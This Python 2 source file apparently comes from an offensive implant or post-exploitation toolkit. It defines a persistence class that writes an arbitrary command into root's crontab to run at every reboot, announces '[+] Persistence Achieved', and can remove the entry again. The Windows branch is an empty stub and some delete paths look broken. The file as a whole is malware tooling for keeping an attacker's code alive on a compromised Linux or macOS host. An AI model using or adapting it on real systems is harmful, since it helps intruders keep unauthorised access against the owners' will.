import platform
from crontab import CronTab



class PersistenceMGMT(object):
    def __init__(self):
        self.method = self.get_os()

    def get_os(self):
        system = platform.system()

        if system == "Windows":
            return self.windows
        elif system == "Linux":
            return self.linux
        elif system == "Darwin":
            print "[*] Darwin detected"
            return self.darwin

    def windows(self, delete=False):
        pass

    def darwin(self, command, delete=False):
        if not delete:
            self.linux(command)

    def linux(self, command, delete=False):
        cron = CronTab(user='root')
        if not delete and not cron.find_command(command):
            job = cron.new(command=command)
            job.every_reboot()
            print "[+] Persistence Achieved"
        elif delete:
            job = cron.find_command(command)
            cron.remove(job)
        cron.write()

    def persist(self, arg):
        self.method(arg)

    def desist(self, arg):
        self.method(arg, delete=True)
